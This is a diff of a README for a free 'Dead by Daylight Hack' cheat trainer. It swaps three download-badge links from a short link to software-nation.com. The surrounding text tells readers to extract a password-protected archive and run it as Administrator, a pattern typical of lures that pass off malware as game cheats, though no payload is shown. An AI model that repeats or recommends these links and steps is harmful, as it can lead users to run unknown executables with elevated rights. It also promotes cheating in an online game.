@@ -9,7 +9,7 @@ The **🔪 Dead by Daylight Hack** is a **free** trainer for both Killer and Sur
 
 <div align="center">
 
-[![Download Dead by Daylight Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dead-by-daylight-h4ck)
+[![Download Dead by Daylight Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dead-by-daylight-h4ck)
 
 </div>
 
@@ -109,7 +109,7 @@ Dead by Daylight is intense — but sometimes you want to learn maps, practice l
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch DBD → Press `INSERT` for menu
 
-[![Download Dead by Daylight Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dead-by-daylight-h4ck)
+[![Download Dead by Daylight Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dead-by-daylight-h4ck)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -261,7 +261,7 @@ Learn Dead by Daylight without the stress for free. **Dead by Daylight Hack** gi
 
 <div align="center">
 
-[![Download Dead by Daylight Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/dead-by-daylight-h4ck)
+[![Download Dead by Daylight Hack](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/dead-by-daylight-h4ck)
 
 **Version 4.6.1** — Free DBD trainer. April 2026 update. Zero cost. No payment.
 
